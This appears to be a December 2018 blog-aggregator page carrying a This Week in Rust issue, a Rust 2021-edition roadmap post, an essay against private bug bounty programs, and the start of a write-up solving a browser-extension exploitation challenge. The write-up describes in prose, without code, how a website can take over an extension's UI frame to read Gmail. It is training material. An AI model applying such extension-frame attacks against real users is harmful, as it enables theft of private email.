If you find any errors in this week's issue, <a href="https://github.com/cmr/this-week-in-rust/pulls">please submit a PR</a>.</p>
<h3>Updates from Rust Community</h3>
<h4>News &amp; Blog Posts</h4>
<ul>
<li>üéàüéâ <a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">Announcing Rust 1.31 and Rust 2018</a>. üéâüéà</li>
<li><a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/">Rust 2018 is here‚Ä¶ but what is it</a>?</li>
<li><a href="https://rustwasm.github.io/2018/12/06/reflecting-on-rust-and-wasm-in-2018.html">Reflecting on Rust and WebAssembly in 2018</a>.</li>
<li><a href="https://rocket.rs/v0.4/news/2018-12-08-version-0.4/">Rocket v0.4: Typed URIs, database support, revamped queries, &amp; more</a>.</li>
<li><a href="https://blag.nemo157.com/2018/12/09/inside-rusts-async-transform.html">Inside Rust's async transform</a>.</li>
<li><a href="https://blog.waffles.space/2018/12/07/deep-dive-into-hashbrown/">The Swiss army knife of hashmaps</a>.</li>
<li><a href="https://medium.com/@amalec/building-alexa-skills-in-rust-4cf54a497ea4">Building Alexa Skills in Rust</a>.</li>
<li><a href="https://boats.gitlab.io/blog/post/romio/">Wherefore art thou Romio</a>? Romio is a port of a small part of the Tokio project to the newer futures APIs.</li>
<li><a href="https://adelbertc.github.io/posts/2018-12-10-rust-existentials.html">Existential types in Rust</a>.</li>
<li><a href="https://hashnode.com/post/currying-in-rust-cjpfb0i2z00cm56s2aideuo4z">Currying in Rust</a>.</li>
<li><a href="https://www.ncameron.org/blog/more-on-rls-version-numbering/">More on RLS version numbering</a>.</li>
<li><a href="https://people.gnome.org/~federico/blog/guadec-2018-presentation.html">Patterns of Refactoring C to Rust: The case of librsvg</a>.</li>
</ul>
<h5>#Rust2019</h5>
<ul>
<li><a href="https://www.ncameron.org/blog/rust-in-2022/">Rust in 2022 (and 2019)</a>.</li>
<li><a href="http://fitzgeraldnick.com/2018/12/11/rust-2019-think-bigger.html">Rust 2019: Think bigger</a>.</li>
<li><a href="https://www.jonathanturner.org/2018/12/the-fallow-year.html">The Fallow Year</a>.</li>
<li><a href="https://twitter.com/eddyb_r/status/1072444398284300289">eddyb's wishes for Rust in 2019</a>.</li>
<li><a href="https://pcwalton.github.io/2018/12/07/plans-for-2019.html">pcwalton's plans for 2019</a>.</li>
<li><a href="https://www.reddit.com/r/rust/comments/a4ygji/lokathors_rust_2019_wishpost/">Lokathor's Rust 2019 wishpost</a>.</li>
<li><a href="https://llogiq.github.io/2018/12/08/rust.html">Rust 2019 - The road ahead</a>.</li>
<li><a href="https://www.reddit.com/r/rust/comments/a3sav1/2019_roadmap_more_like_a_wishlist_finish_and_ship/">2019 wishlist - Finish and ship the work that has already started</a>.</li>
<li><a href="https://www.reddit.com/r/rust/comments/a44txf/rust_2019_a_newbies_thoughts/">Rust 2019: a newbie's thoughts</a>.</li>
<li><a href="https://medium.com/@GolDDranks/rust-2019-let-us-pursue-composability-70f1eb2238c3">Rust 2019‚Ää‚Äî‚Äälet us pursue composability</a>.</li>
<li><a href="https://www.reddit.com/r/rust/comments/a59b3a/2019_wishlistpain_points/">2019 Wishlist/Pain points</a>.</li>
<li><a href="https://twitter.com/PistonDeveloper/status/1072193819855196160">Rust 2019 - Named argument syntax</a>.</li>
</ul>
<h3>Crate of the Week</h3>
<p>This week's crate is <a href="https://github.com/Peltoche/lsd">lsd</a>, a colorful and fast <code>ls</code> replacement. Thanks to <a href="https://users.rust-lang.org/t/crate-of-the-week/2704/471">Pierre Peltier</a> for the suggestion!</p>
<p><a href="https://users.rust-lang.org/t/crate-of-the-week/2704">Submit your suggestions and votes for next week</a>!</p>
<h3>Call for Participation</h3>
<p>Always wanted to contribute to open-source projects but didn't know where to start?
Every week we highlight some tasks from the Rust community for you to pick and get started!</p>
<p>Some of these tasks may also have mentors available, visit the task page for more information.</p>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">A call for Rust 2019 Roadmap blog posts</a>.</li>
<li><a href="https://cfp.rustlatam.org/events/rust-latam">Rust Latam CFP is now open, deadline is December 31st</a>.</li>
<li><a href="https://github.com/xd009642/tarpaulin/issues/152">Tarpaulin: OSX support tracking issue</a>. Tarpaulin is a code coverage tool for Rust projects.</li>
<li><a href="https://imag-pim.org/blog/2018/12/04/call-for-participation-2/">The imag project calls for contributors (2)</a>.</li>
</ul>
<p>If you are a Rust project owner and are looking for contributors, please submit tasks <a href="https://users.rust-lang.org/t/twir-call-for-participation/4821">here</a>.</p>
<h3>Updates from Rust Core</h3>
<p>264 pull requests were <a href="https://github.com/search?q=is%3Apr+org%3Arust-lang+is%3Amerged+merged%3A2018-12-03..2018-12-10">merged in the last week</a></p>
<ul>
<li><a href="https://github.com/rust-lang/rust/pull/56467">bump stack size to 32MB</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56620">resolve: reduce some clutter in import ambiguity errors</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56392">delay gensym creation for "<code>_</code> items" (<code>use foo as _</code>/<code>const _</code>) until name resolution</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55871">codegen_llvm_back: improve allocations</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/54517">panic on include bytes of own file</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56460">fix ICE with generators and NLL</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55922">fix ICE in <code>const</code> slice patterns</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56456">handle existential types in dead code analysis</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56388">more MIR borrow check cleanup</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56269">use a <code>SmallVec</code> within <code>_match::Matrix</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56250">introduce <code>ptr::hash</code> for references</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55635">allow calling <code>const unsafe fn</code> in <code>const fn</code> behind a feature gate</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55010">add template parameter debuginfo to generic types</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55987">add <code>Weak.ptr_eq</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56548">optimized <code>String</code> <code>FromIterator</code> + <code>Extend</code> impls</a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/6402">only ensure solutions are in the same file in <code>cargo fix</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55933">emit error when doc generation fails</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56498">rustdoc: Fix line numbers display</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56315">rustdoc inline macro reexport</a></li>
<li><a href="https://github.com/rust-lang/crates.io/pull/1567">crates.io: Mark API tokens as revoked</a></li>
</ul>
<h4>Approved RFCs</h4>
<p>Changes to Rust follow the Rust <a href="https://github.com/rust-lang/rfcs#rust-rfcs">RFC (request for comments)
process</a>. These
are the RFCs that were approved for implementation this week:</p>
<p><em>No RFCs were approved this week.</em></p>
<h4>Final Comment Period</h4>
<p>Every week <a href="https://www.rust-lang.org/team.html">the team</a> announces the
'final comment period' for RFCs and key PRs which are reaching a
decision. Express your opinions now.</p>
<h5><a href="https://github.com/rust-lang/rfcs/labels/final-comment-period">RFCs</a></h5>
<p><em>No RFCs are currently in final comment period.</em></p>
<h5><a href="https://github.com/rust-lang/rust/labels/final-comment-period">Tracking Issues &amp; PRs</a></h5>
<ul>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/pull/56351">Stabilize <code>linker-flavor</code> flag.</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/pull/56303">Stabilize <code>underscore_imports</code></a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/55607">Tracking issue for unsafe operations in const fn</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/54881">Tracking issue for RFC 2539, "#[cfg_attr] expanding to multiple attributes"</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/33158"><code>#[repr(packed(N))]</code> (tracking issue for RFC 1399)</a>.</li>
</ul>
<h4>New RFCs</h4>
<p><em>No new RFCs were proposed this week.</em></p>
<h3>Upcoming Events</h3>
<h5>Online</h5>
<ul>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Dec 17. Rust Community Content Subteam Meeting on Discord</a>.</li>
<li><a href="https://t.me/joinchat/EkKINhHCgZ9llzvPidOssA">Dec 19. Rust Events Team Meeting on Telegram</a>.</li>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Dec 26. Rust Community Team Meeting on Discord</a>.</li>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Dec 31. Rust Community Content Subteam Meeting on Discord</a>.</li>
</ul>
<h5>Asia Pacific</h5>
<ul>
<li><a href="https://www.meetup.com/mad-rs/events/257072971/">Dec 15. Chennai, IN - Rust Monthly Meetup - December</a>.</li>
<li><a href="https://www.meetup.com/Rust-Sydney/events/256668602/">Dec 16. Sydney, AU - Rust Sydney Meetup 15</a>.</li>
</ul>
<h5>Europe</h5>
<ul>
<li><a href="https://rustrush.ru/">Dec 15 &amp; 16. Moscow, RU - RustRush 2018</a>.</li>
<li><a href="https://www.meetup.com/Rust-Utrecht/events/257031905/">Dec 17. Utrecht, NL - Rust Hacknight</a>.</li>
<li><a href="https://www.meetup.com/Cambridge-Rust-Meetup/events/pzwshpyxqbbc/">Dec 20. Cambridge, GB - The Last Cambridge Rust</a>?</li>
<li><a href="https://www.meetup.com/Mozilla-Torino/events/sbtclqyxqbkc/">Dec 20. Turin, IT - Gruppo di studio Rust</a>.</li>
<li><a href="https://www.meetup.com/spbrust/events/gzjnmqyxqbfc">Dec 23. St. Petersburg, RU - St. Petersburg Rust Meetup</a>.</li>
<li><a href="https://www.meetup.com/opentechschool-berlin/events/rjgkhqyxqbjc/">Dec 26. Berlin, DE - Berlin Rust Hack and Learn</a>.</li>
</ul>
<h5>North America</h5>
<ul>
<li><a href="https://www.meetup.com/RustDC/events/256181658">Dec 13. Arlington, US - Rust DC ‚Äî Using C's va_list in Rust (and why you never should)</a>.</li>
<li><a href="https://www.meetup.com/columbus-rs/events/dbcfrpyxqbrb/">Dec 13. Columbus, US - Columbus Rust Society - Monthly Meeting</a>.</li>
<li><a href="https://www.meetup.com/utahrust/events/255209738/">Dec 13. Utah, US - Utah Rust monthly meetup</a>.</li>
<li><a href="https://www.meetup.com/San-Diego-Rust/events/256264465/">Dec 13. San Diego, US - San Diego Rust December Meetup - Rust 2018 Overview + Memory Allocator</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbvb/">Dec 16. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/triangle-rustaceans/events/mfglwpyxqbgc/">Dec 17. Durham, US - Triangle Rustaceans</a>.</li>
<li><a href="https://www.meetup.com/Chicago-Rust-Meetup/events/256778181">Dec 20. Chicago, US - Rust for the Holidays</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbfc/">Dec 23. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/Dallas-Rust/events/zfgwzmyxqbhc/">Dec 25. Dallas, US - Dallas Rust - Last Tuesday</a>.</li>
<li><a href="https://www.meetup.com/Ann-Arbor-Rust-Meetup/events/cgsskqyxqbjc/">Dec 26. Ann Arbor, US - Ann Arbor Rust Meetup</a>.</li>
<li><a href="https://www.meetup.com/Vancouver-Rust/events/rzszlqyxqbjc/">Dec 26. Vancouver, CA - Vancouver Rust meetup</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbnc/">Dec 30. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
</ul>
<p>If you are running a Rust event please add it to the <a href="https://www.google.com/calendar/embed?src=apd9vmbc22egenmtu5l6c5jbfc%40group.calendar.google.com">calendar</a> to get
it mentioned here. Please remember to add a link to the event too.
Email the <a href="mailto:community-team@rust-lang.org">Rust Community Team</a> for access.</p>
<h3>Rust Jobs</h3>
<ul>
<li><a href="https://paritytech.io/jobs/">Rust Developer at Parity, Berlin, DE</a>.</li>
<li><a href="https://www.commure.com/#jobSection">Rust Engineer at Commure, Inc. (San Francisco, Boston, Montreal)</a>.</li>
<li><a href="https://twitter.com/nonparibus/status/1067893414765764614">Tech Lead at Hashintel, London, GB</a>.</li>
<li><a href="https://angel.co/finhaven/jobs/411238-intermediate-software-developer">Intermediate Software Developer at Finhaven, Vancouver, CA</a>.</li>
</ul>
<p><em>Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> to get your job offers listed here!</em></p>
<h3>Quote of the Week</h3>
<blockquote>
<p>I'll know ide support is mature when the flame wars start.</p>
</blockquote>
<p>‚Äì Unnamed friend of arthrowpod</p>
<p>Thanks to <a href="https://users.rust-lang.org/t/twir-quote-of-the-week/328/587">arthrowpod</a> for the suggestion!</p>
<p><a href="http://users.rust-lang.org/t/twir-quote-of-the-week/328">Please submit your quotes for next week</a>!</p>
<p><em>This Week in Rust is edited by: <a href="https://github.com/nasa42">nasa42</a>, <a href="https://github.com/llogiq">llogiq</a>, and <a href="https://github.com/Flavsditz">Flavsditz</a>.</em></p>
<p><small><a href="https://www.reddit.com/r/rust/comments/a5hbo7/this_week_in_rust_264/">Discuss on r/rust</a>.</small></p></div></div><div class="permalink"><a href="https://this-week-in-rust.org/blog/2018/12/11/this-week-in-rust-264/">by TWiR Contributors at <time datetime="2018-12-11T05:00:00Z" title="December 11, 2018 05:00 AM GMT">‰∏ãÂçà1:00:00</time></a></div></div><div class="news nick-cameron"><a id="news-37"></a><h3><a href="http://www.ncameron.org/blog/" title="featherweight musings">Nick Cameron</a> ‚Äî <a href="http://www.ncameron.org/blog/rust-in-2022/">Rust in 2022</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><p>A response to the <a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">call for 2019 roadmap blog posts</a>.</p>
<p>In case you missed it, we released our <a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">second edition</a> of Rust this year! An edition is an opportunity to make backwards incompatible changes, but more than that it's an opportunity to bring attention to how programming in Rust has changed. With the 2018 edition out of the door, now is the time to think about the next edition: how do we want programming in Rust in 2022 to be different to programming in Rust today? Once we've worked that out, lets work backwards to what should be done in 2019.</p>
<p>Without thinking about the details, lets think about the timescale and cadence it gives us. It was three years from Rust 1.0 to Rust 2018 and I expect it will be three years until the next edition. Although I think the edition process went quite well, I think that if we'd planned in advance then it could have gone better. In particular, it felt like there were a lot of late changes which could have happened earlier so that we could get more experience with them. In order to avoid that I propose that we aim to avoid breaking changes and large new features landing after the end of 2020. That gives 2021 for finishing, polishing, and marketing with a release late that year. Working backwards, 2020 should be an 'impl year' - focussing on designing and implementing the things we know we want in place for the 2021 edition. 2019 should be a year to invest while we don't have any release pressure.</p>
<p>To me, investing means paying down technical debt, looking at our processes, infrastructure, tooling, governance, and overheads to see where we can be more efficient in the long run, and working on 'quality of life' improvements for users, the kind that don't make headlines but will make using Rust a better experience. It's also the time to investigate some high-risk, high-reward ideas that will need years of iteration to be user-ready; 2019 should be an exciting year!</p>
<h3>The 2021 edition</h3>
<p>I think Rust 2021 should be about Rust's maturity. But what does that mean? To me it means that for a programmer in 2022, Rust is a safe choice with many benefits, not a high-risk/high-reward choice. Choosing Rust for a project should be a competitive advantage (which I think it is today), but it should not require investment in libraries, training, or research.</p>
<p>Some areas that I think are important for the 2021 edition:</p>
<ul>
<li>sustainability: Rust has benefited from being a new and exciting language. As we get more mature, we'll become less exciting. We need to ensure that the Rust project has sufficient resources for the long term, and that we have a community and governance structure that can support Rust through the (hopefully) long, boring years of its existence. We'll need to think of new ways to attract and retain users (as well as just being awesome).</li>
<li>diversity: Rust's community as a good reputation as a welcoming community. However, we are far from being a diverse one. We need to do more.</li>
<li>mature tools: Cargo must be more flexible, IDE support must be better, debugging, profiling, and testing need to be easy to use, powerful, and flexible. We need to provide the breadth and depth of tool support which users expect from established languages.</li>
<li>async programming: high-performance network programming is an amazing fit for Rust. Work on Linkerd and Fuchsia has already proved this out. Having a good story around async programming will make things even better. I believe Rust could be the best choice in this domain by a wide margin. However, building out the whole async programming story is a huge task, touching on language features, libraries, documentation, programming techniques, and crates. The current work already feels huge and I believe that this is only the beginning of iteration.</li>
<li>std, again: Rust's standard library is great, a point in favour of Rust. Since Rust 1.0 there have been steady improvements, but the focus has been on the wider ecosystem. I think for the next edition we will need to consider a second wave of work. There are some fundamental things that are worth re-visiting (e.g., Parking Lot mutexes), and a fair few things where our approach has been to let things develop as crates 'for now', and where we either need to move them into std, or re-think user workflow around discoverability, etc. (e.g., Crossbeam, Serde).</li>
<li>error handling: we really need to improve the ergonomics of error handling. Although the mechanism is (IMO) really great, it is pretty high-friction compared to exceptions. We should look at ways to improve this (<code>Ok</code>-wrapping, <code>throws</code> in function signatures, etc.). I think this is an edition issue since it will probably require a breaking change, and at the least will change the style of programming.</li>
<li>macros: we need to 'finish' macros, both procedural and declarative. That means being confident about our hygiene and naming implementation, iterating on libraries, stabilising everything, and supporting the modern <code>macro</code> syntax.</li>
<li>internationalisation: we need to do much better. We need internationalisation and localisation libraries on a path to stabilisation, either in std or discoverable and easily usable as crates. It should be as easy to print or use a multi-locale string as a single-locale one. We also need to do better at the project-level - more local conferences, localised documentation, better ways for non-English speakers to be part of the Rust community.</li>
</ul>
<p>Let's keep focussing on areas where Rust has proven to be a good fit (systems, networking, embedded (both devices and as performance-critical components in larger systems), WASM, games) <em>and</em> looking for new areas to expand into.</p>
<h3>2019</h3>
<p>So, with the above in mind, what should we be doing next year? Each team should be thinking about what are the high-risk experiments to try. How can we tackle technical (and community) debt? What can be polished? Lets spend the year making sure we are on the right track for the next edition and the long-term by encouraging people to dedicate more energy to strategy.</p>
<p>Of course we want to plan some concrete work too, so in no particular order here are some specific ideas I think are worth looking into:</p>
<ul>
<li>discoverability of libraries and tools: how does a new user find out about Serde or Clippy?</li>
<li>project infrastructure: are bors, homu, our repo structures, and our processes optimal? How can we make contributing to Rust easier and faster?</li>
<li>the RFC process: RFCs are good, but the process has some weaknesses: discussion is scattered around different venues, discussions are often stressful, writing an RFC is difficult, and so forth. We can do better!</li>
<li>project governance: we have to keep scaling and iterating. 2019 is a good opportunity to think about our governance structures.</li>
<li>moderation and 'tone' of discussion: we need to keep scaling moderation and think about better ways to moderate forums. Right now we do a good job of enforcing the CoC and removing egregious offenders, however, many of our forums can feel overwhelming or hostile. We should strive for more professional and considerate spaces.</li>
<li>security of Rust code: starting the secure code working group is very timely. I think we're going to have look closely at ways we can make using and working with Rust code safer. From changes to Cargo and crates.io, to reasoning about unsafe code.</li>
<li>games and graphics: as well as keeping going with the existing domain working groups, we should also look at games and graphics. Since these are such performance sensitive areas, Rust should be a good fit. There is already a small, but energetic community here and some initial uses in production.</li>
<li>async/await and async programming: we need to keep pushing here on all fronts (language, std, crates, docs, gaining experience)</li>
</ul>
<p>And lets dive a tiny bit deeper into a few areas:</p>
<h4>Dev-tools</h4>
<ul>
<li>Cargo: Cargo needs to integrate better into other build system and IDEs. There are a lot of places people want more flexibility, it will take another blog post to get into this.</li>
<li>More effort on making the RLS good.</li>
<li>Better IDE experience: more features, more polish, debugging and profiling integration.</li>
<li>integrating Rustdoc, docs.rs, and cargo-src to make a best-in-class documentation and source code exploration experience</li>
<li>work on a query API for the compiler to be a better base for building tools. Should support Clippy as well as the RLS, code completion, online queries, etc.</li>
</ul>
<h4>Language</h4>
<p>Even more than the other areas, the language team needs to think about development cadence in preparation for the next edition. We need to ensure that everything, especially breaking changes, get enough development and iteration time.</p>
<p>Some things I think we should consider in 2019:</p>
<ul>
<li>generic associated types or HKTs or whatever: we need to make sure we have a feature which solves the problems we need to solve and isn't going to require more features down the road (i.e., we should aim for this being the last addition to the trait system).</li>
<li>specialisation: is this going to work? I think that in combination with macros, there are some smart ways that we can work with error types and do some inheritance-like things.</li>
<li>keep pushing on unfinished business (macros, impl Trait, const functions, etc.).</li>
<li>named and optional arguments: this idea has been around for a while, but has been low priority. I think it would be very useful (there are some really ergonomic patterns in Swift that we might do well to emulate).</li>
<li>enum variant types: this is small, but I REALLY WANT IT!</li>
<li>gain experience with, and polish the new module system</li>
<li>identify and fix paper cuts</li>
</ul>
<h4>Compiler</h4>
<p>Nothing really new here, but we need to keep pushing on compiler performance - it comes up again and again as a Rust negative. We should also take the timing opportunity to do some refactoring, for example, landing Chalk and doing something similar for name resolution.</p>
</div></div></div><div class="permalink"><a href="http://www.ncameron.org/blog/rust-in-2022/">by Nick Cameron at <time datetime="2018-12-11T04:34:31Z" title="December 11, 2018 04:34 AM GMT">‰∏ãÂçà12:34:31</time></a></div></div><h2><time datetime="2018-12-10">Monday, 10 December 2018</time></h2><div class="news wladimir-palant" xml:lang="en-us"><a id="news-38"></a><h3><a href="https://palant.de/" title="Wladimir Palant's notes - mozilla - gecko - security">Wladimir Palant</a> ‚Äî <a href="https://palant.de/2018/12/10/if-your-bug-bounty-program-is-private-why-do-you-have-it">If your bug bounty program is private, why do you have it?</a></h3><div class="entry"><div class="content"><p>The big bug bounty platforms are structured like icebergs: the public bug bounty programs that you can see are only a tiny portion of everything that is going on there. As you earn your reputation on these platforms, they will be inviting you to private bug bounty programs. The catch: you generally aren‚Äôt allowed to discuss issues reported via private bug bounty programs. In fact, you are not even allowed to discuss the very existence of that bug bounty program.</p>

<p>I‚Äôve been playing along for a while on Bugcrowd and Hackerone and submitted a number of vulnerability reports to private bug bounty programs. As a result, I became convinced that these private bug bounty programs are good for the bottom line of the bug bounty platforms, but otherwise their impact is harmful. I‚Äôll try to explain here.</p>

<h4>What is a bug bounty?</h4>

<p>When you collect a bug bounty, that‚Äôs not because you work for a vendor. There is no written contract that states your rights and obligations. In its original form, you simply stumble upon a security vulnerability in a product and you decide to do the right thing: you inform the vendor. In turn, the vendor gives you the bug bounty as a token of their appreciation. It could be a monetary value but also some swag or an entry in the Hall of Fame.</p>

<p>Why pay you when the vendor has no obligation to do so? Primarily to keep you doing the right thing. Some vulnerabilities could be turned into money on the black market. Some could be used to steal data or extort the vendor. Everybody prefers people to earn their compensation in a legal way. Hence bug bounties.</p>

<h4>What the bug bounty isn‚Äôt</h4>

<p>There are so many bug bounty programs around today that many people made them their main source of income. While there are various reasons for that, one thing should not be forgotten: there is no law guaranteeing that you will be paid fairly. No contract means that your reward is completely dependent on the vendor. And it is hard to know in advance, sometimes the vendor will claim that they cannot reproduce, or downplay severity, or mark your report as a duplicate of a barely related report. In at least some cases there appears to be intent behind this behavior, the vendor trying to fit the bug bounty program into a certain budget regardless of the volume of the reports. So any security researcher trying to make a living from bug bounties has to calculate pessimistically, e.g. expecting that only one out of five reports will get a decent reward.</p>

<p>On the vendor‚Äôs side, there is a clear desire for the bug bounty program to replace penetration tests. Bugcrowd noticed this trend and is tooting their bug bounty programs as the ‚Äúnext gen pen test.‚Äù The trouble is, bug bounty hunters are only paid for bugs where they can demonstrate impact. They have no incentives to report minor issues, not only will the effort of demonstrating the issue be too high for the expected reward, it also reduces their rating on the bug bounty platform. They have no incentives to point out structural weaknesses, because these reports will be closed as ‚Äúinformational‚Äù without demonstrated impact. They often have no incentives to go for the more obscure parts of the product, these require more time to get familiar with but won‚Äôt necessarily result in critical bugs being discovered. In short, a ‚Äúpenetration test‚Äù performed by bug bounty hunters will be everything but thorough.</p>

<h4>How are private bug bounties different for researchers?</h4>

<p>If you feel that you are treated unfairly by the vendor, you have essentially two options. You can just accept it and vote with your feet: move on to another bug bounty program and learn how to recognize programs that are better avoided. The vendor won‚Äôt care as there will be plenty of others coming their way. Or you can make a fuzz about it. You could try to argue and probably escalate to the bug bounty platform vendor, but <span class="caps">IMHO</span> this rarely changes anything. Or you could publicly shame the vendor for their behavior and warn others.</p>

<p>The latter is made impossible by the conditions to participate in private bug bounty programs. Both Bugcrowd and Hackerone disallow you from talking about your experience with the program. Bug bounty hunters are always dependent on the good will of the vendor, but with private bug bounties it is considerably worse.</p>

<p>But it‚Äôs not only that. Usually, security researchers want recognition for their findings. Hackerone even has a process for disclosing vulnerability reports once the issue has been fixed. Public Bugcrowd programs also usually provision for coordinated disclosure. This gives the reporters the deserved recognition and allows everybody else to learn. But guess what: with private bug bounty programs, disclosure is always forbidden.</p>

<p>Why will people participate in private bug bounties at all? Main reason seems to be the reduced competition, finding unique issues is easier. In particular, when you join in the early days of a private bug bounty program, you have a good opportunity to generate cash with low hanging fruit.</p>

<h4>Why do companies prefer private bug bounties?</h4>

<p>If a bug bounty is about rewarding a random researcher who found a vulnerability in the product, how does a private bug bounty program make sense then? After all, it is like an exclusive club and unlikely to include the researcher in question. In fact, that researcher is unlikely to know about the bug bounty program, so they won‚Äôt have this incentive to do the right thing.</p>

<p>But the obvious answer is: the bug bounty platforms aren‚Äôt actually selling bug bounty management, they are selling penetration tests. They promise vendors to deliver high-quality reports from selected hackers instead of the usual noise that a public bug bounty program has to deal with. And that‚Äôs what many companies expect (but don‚Äôt receive) when they create a private bug bounty.</p>

<p>There is another explanation that seems to match many companies. These companies know perfectly well that they just aren‚Äôt ready for it yet. Sometimes they simply don‚Äôt have the necessary in-house expertise to write secure code, so even with they bug bounty program always pointing out the same mistakes they will keep repeating them. Or they won‚Äôt free up developers from feature work to tackle security issues, so every year they will fix five issues that seem particularly severe but leave all the others untouched. So they go for a private bug bounty program because doing the same thing in public would be disastrous for their PR. And they hope that this bug bounty program will somehow make their product more secure. Except it doesn‚Äôt.</p>

<p>On Hackerone I also see another mysterious category: private bug bounty programs with zero activity. So somebody went through the trouble of setting up a bug bounty program but failed to make it attractive to researchers. Either it offers no rewards, or it expects people to buy some hardware that they are unlikely to own already, or the description of the program is impossible to decipher. Just now I‚Äôve been invited to a private bug bounty program where the company‚Äôs homepage was completely broken, and I still don‚Äôt really understand what they are doing. I suspect that these bug bounty programs are another example of features that <a href="http://blogs.msdn.com/oldnewthing/archive/2006/11/01/922449.aspx">somebody got a really nice bonus for</a> but nobody cared putting any thought into.</p>

<p>Somebody told me that their company went with a private bug bounty because they work with selected researchers only. So it isn‚Äôt actually a bug bounty program but really a way to manage communication with that group. I hope that they still have some other way to engage with researchers outside that elite group, even if it doesn‚Äôt involve monetary rewards for reported vulnerabilities.</p>

<h4>Conclusions</h4>

<p>As a security researcher, I‚Äôve collected plenty of bad experiences with private bug bounty programs, and I know that other people did as well. Let‚Äôs face it: the majority of private bug bounty programs shouldn‚Äôt have existed in the first place. They don‚Äôt really make the products in question more secure, and they increase frustration among security researchers. And while some people manage to benefit financially from these programs, others are bound to waste their time on them. The confidentiality clauses of these programs substantially weaken the position of the bug bounty hunters, which isn‚Äôt too strong to start with. These clauses are also an obstacle to learning on both sides, ideally security issues should always be publicized once fixed.</p>

<p>Now the ones who should do something to improve this situations are the bug bounty platforms. However, I realize that they have little incentive to change this situation and are in fact actively embracing it. So while one can ask for example for a way to comment on private bug bounty programs so that newcomers can learn from the experience that others made with this program, such control mechanisms are unlikely to materialize. Publishing anonymized reports from private bug bounty programs would also be nice and just as unlikely. I wonder whether the solution is to add such features via a browser extension and whether it would gain sufficient traction then.</p>

<p>But really, private bug bounty programs are usually a bad idea. Most companies doing that right now should either switch to a public bug bounty or just drop their bug bounty program altogether. <a href="https://twitter.com/k8em0/">Katie Moussouris</a> is already very busy convincing companies to drop bug bounty programs they cannot make use of, please help her and join that effort.</p></div></div><div class="permalink"><a href="https://palant.de/2018/12/10/if-your-bug-bounty-program-is-private-why-do-you-have-it">by Wladimir Palant at <time datetime="2018-12-10T14:21:30Z" title="December 10, 2018 02:21 PM GMT">‰∏ãÂçà10:21:30</time></a></div></div><div class="news wladimir-palant" xml:lang="en-us"><a id="news-39"></a><h3><a href="https://palant.de/" title="Wladimir Palant's notes - mozilla - gecko - security">Wladimir Palant</a> ‚Äî <a href="https://palant.de/2018/12/10/bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension">BBN challenge resolution: Exploiting the Screenshotter.PRO browser extension</a></h3><div class="entry"><div class="content"><p>The time has come to reveal the answer to my next BugBountyNotes challenge called <a href="https://www.bugbountynotes.com/challenge?id=17">Try out my Screenshotter.PRO browser extension</a>. This challenge is a browser extension supposedly written by a naive developer for the purpose of taking webpage screenshots. While the extension is functional, the developer discovered that some websites are able to take a peek into their Gmail account. How does that work?</p>

<p>If you haven‚Äôt looked at this challenge yet, feel free to stop reading at this point and go try it out. Mind you, this one is hard and only two people managed to solve it so far. Note also that I won‚Äôt look at any answers submitted at this point any more. Of course, you can also participate in any of the <a href="https://www.bugbountynotes.com/training">ongoing challenges</a> as well.</p>

<p>Still here? Ok, I‚Äôm going to explain this challenge then.</p>

<h4>Taking control of the extension UI</h4>

<p>This challenge has been inspired by the <a href="https://palant.de/2017/11/11/on-web-extensions-shortcomings-and-their-impact-on-add-on-security">vulnerabilities I discovered around the Firefox Screenshots feature</a>. Firefox Screenshots is essentially a built-in browser extension in Firefox, and while it takes care to isolate its user interface in a frame protected by the same-origin policy, I discovered a race condition that allowed websites to change that frame into something they can access.</p>

<p>This race condition could not be reproduced in the challenge because the approach used works in Firefox only. So the challenge uses a different approach to protect its frame from unwanted access: it creates a frame pointing to https://example.com/ (the website cannot access it due to same-origin policy), then injects its user interface into this frame via a separate content script. And since a content script can only be injected into all frames of a tab, the content script uses the (random) frame name to distinguish the ‚Äúcorrect‚Äù frame.</p>

